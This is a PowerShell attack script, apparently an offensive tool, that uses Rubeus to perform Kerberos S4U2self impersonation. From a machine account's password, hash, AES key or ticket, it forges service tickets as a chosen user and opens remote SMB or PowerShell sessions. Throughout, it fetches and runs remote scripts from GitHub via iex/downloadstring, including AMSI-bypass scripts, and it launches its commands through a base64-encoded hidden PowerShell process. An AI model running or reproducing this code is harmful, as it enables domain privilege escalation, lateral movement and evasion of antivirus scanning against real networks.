function Invoke-s4u2self {
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$DomainController,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$ComputerName,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$NTHash,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$AES256,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Ticket,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Impersonate,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$PSRemoting,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$SMBRemoting
	)
	
	if(!$Domain){
		# Call the function
		$Domain = Get-Domain
	}
	
	if(!$DomainController){
		# Call the function
		$TempDCName = Get-DomainController -trgtdomain $Domain
		if($TempDCName){
			$DomainController = "$TempDCName.$Domain"
		}
		else{
			Write-Error "Failed to identify the Domain Controller."
		}
	}
	
	$ComputerName = $ComputerName.TrimEnd('$')
	
	$CleanHostname = ($ComputerName -split "\.")[0]
	
	$DollarHostname = "$CleanHostname$"
	
	$FQDNHostname = $CleanHostname + "." + $Domain
	
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
	
	# Define set of commands
	
	if($ComputerName -AND $Password){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /password:$Password /domain:$Domain /dc:$DomainController /nowrap
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	if($ComputerName -AND $NTHash){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /rc4:$NTHash /domain:$Domain /dc:$DomainController /nowrap
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	if($ComputerName -AND $AES256){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /aes256:$AES256 /domain:$Domain /dc:$DomainController /nowrap /opsec
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	if($ComputerName -AND $Ticket){
		$FinalTicket = $Ticket
	}
	
	if($SMBRemoting){
	
	$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Enter-SMBSession -ComputerName $FQDNHostname
"@
	}
	
	if($PSRemoting){
		
	$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Enter-PSSession -ComputerName $FQDNHostname
"@
	}
	
	$commands | Out-File "C:\Users\Public\Documents\comm.txt"
	$finalcommand = 'Invoke-Expression (Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw)'
	
	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))	
	Invoke-Rubeus createnetonly /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /show > $null
	Write-Output ""
	Write-Output "Attempting to access the remote machine..."
	Write-Output ""
}

function Get-Domain {
	
	Add-Type -AssemblyName System.DirectoryServices
	
	try{
		$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		$RetrieveDomain = $RetrieveDomain.Name
	}
	catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	
	$RetrieveDomain
}

function Get-DomainController {
	param (
		[string]$trgtdomain
	)
	
	Add-Type -AssemblyName System.DirectoryServices

	# Create a DirectoryEntry object
	$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$trgtdomain")

	# Create a DirectorySearcher object
	$searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
	$searcher.Filter = "(objectClass=domainDNS)"
	$searcher.PropertiesToLoad.Add("fSMORoleOwner") > $null  # Redirect output to $null to keep the console clean

	# Perform the search
	$results = $searcher.FindOne()
	
	if ($results) {
		# Extract the FSMO role owner DN
		$pdcDn = $results.Properties["fsmoroleowner"][0]

		# Extract the DC name from the DN
		$dcNamePattern = "CN=([^,]+),CN=Servers," 
		if ($pdcDn -match $dcNamePattern) {
			return $matches[1] # Return the actual DC name
		} 
	} 
}